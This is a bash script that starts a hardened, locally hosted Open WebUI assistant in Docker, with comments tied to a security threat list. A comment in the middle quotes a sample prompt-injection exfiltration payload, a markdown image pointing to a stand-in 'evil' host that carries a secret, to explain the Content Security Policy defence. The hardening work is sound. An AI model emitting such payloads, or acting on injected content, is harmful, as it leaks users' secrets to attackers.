#!/usr/bin/env bash
# Start Open WebUI for Julz. Run with: sudo ./run-webui.sh
# Hardening follows SECURITY.md (threats 2, 3, 9, 10).
set -euo pipefail

# v0.11.4, pinned by digest so the image cannot change under us (threat 10)
IMAGE="ghcr.io/open-webui/open-webui@sha256:9591b13f13843c7721c2b8eaf7382846c81b3ffe126526d1888d1fed50c6a33f"

# Paths live under the home of the user who ran sudo, not under /root
ME="${SUDO_USER:?run this with sudo from your own account}"
USER_HOME="$(getent passwd "$ME" | cut -d: -f6)"

# Secret key lives outside the repo (threat 3)
ENV_FILE="$USER_HOME/.config/julz/openwebui.env"

docker rm -f open-webui 2>/dev/null || true

# Run as my uid, not root: notes written to Inbox are mine, and a container escape lands
# as an unprivileged user. Group 0 is how this image grants write access to /app/backend.
# The data volume was created by root, so hand it over once (idempotent).
docker run --rm --user 0 --entrypoint chown -v open-webui:/app/backend/data \
  "$IMAGE" -R 1000:0 /app/backend/data

# CSP: the browser loads images and media only from Open WebUI itself, so an injected
# ![](https://evil/?d=secret) in a reply never makes a request (threat 5).
# Web search goes to local SearXNG (run-searxng.sh). ENABLE_LOCAL_WEB_FETCH=false is the
# default, set explicitly: fetched pages may not resolve to 127.0.0.1, LAN or the lab net (A10 SSRF).
# Host network: Open WebUI binds directly on the host, so HOST must be 127.0.0.1 (threat 2).
# Port 3100 because Juice Shop owns 3000.
# Voice: local Whisper on CPU inside the container, so audio never leaves the laptop (never the
# browser "Web API" STT, Chrome sends that audio to Google). small handles RU/PL/EN. The first
# use downloads it from Hugging Face; AUTO_UPDATE=false keeps it from silently changing (A08).
# Language fixed to ru: auto detection on short phone clips guessed nn, la, en at ~0.35, and
# VAD made it worse (it cut whole clips as silence). English and Polish clips suffer; the
# fix for those is a bigger model (large-v3-turbo), not detection tweaks.
# Pocket: only the public key (ro) and the drop folder (rw) go in. The private key and
# ~/Private are never mounted, so Julz can encrypt drops but never read them.
# The vault's .git is covered by an empty tmpfs: its history holds notes I deleted (threat 69).
# So is feedback/eval: her own wrong answers kept as test cases, never read back (threat 153).
# Docker cannot make that mount point inside the read only bind, so it is made first, as me.
sudo -u "$ME" mkdir -p "$USER_HOME/Documents/julz-mem/feedback/eval"
docker run -d \
  --name open-webui \
  --network host \
  --env-file "$ENV_FILE" \
  -e HOST=127.0.0.1 \
  -e PORT=3100 \
  -e OLLAMA_BASE_URL=http://127.0.0.1:11434 \
  -e ENABLE_COMMUNITY_SHARING=false \
  -e ANONYMIZED_TELEMETRY=false \
  -e DO_NOT_TRACK=true \
  -e SCARF_NO_ANALYTICS=true \
  -e CONTENT_SECURITY_POLICY="img-src 'self' data: blob:; media-src 'self' data: blob:" \
  -e ENABLE_WEB_SEARCH=true \
  -e WEB_SEARCH_ENGINE=searxng \
  -e "SEARXNG_QUERY_URL=http://127.0.0.1:8888/search?q=<query>" \
  -e ENABLE_LOCAL_WEB_FETCH=false \
  -e WHISPER_MODEL=small \
  -e WHISPER_MODEL_AUTO_UPDATE=false \
  -e WHISPER_LANGUAGE=ru \
  -v open-webui:/app/backend/data \
  -v "$USER_HOME/Documents/julz-mem":/data/julz-mem:ro \
  -v "$USER_HOME/Documents/julz-mem/Inbox":/data/julz-mem/Inbox:rw \
  --mount type=tmpfs,destination=/data/julz-mem/.git,tmpfs-size=1m,tmpfs-mode=0500 \
  --mount type=tmpfs,destination=/data/julz-mem/feedback/eval,tmpfs-size=1m,tmpfs-mode=0500 \
  -v "$USER_HOME/.local/state/julz":/data/julz-log:rw \
  -v "$USER_HOME/.config/julz/pocket.pub.jwk":/data/pocket.pub.jwk:ro \
  -v "$USER_HOME/.pocket-drop":/data/pocket-drop:rw \
  --user 1000:0 \
  --cap-drop ALL \
  --security-opt no-new-privileges \
  --restart unless-stopped \
  "$IMAGE"
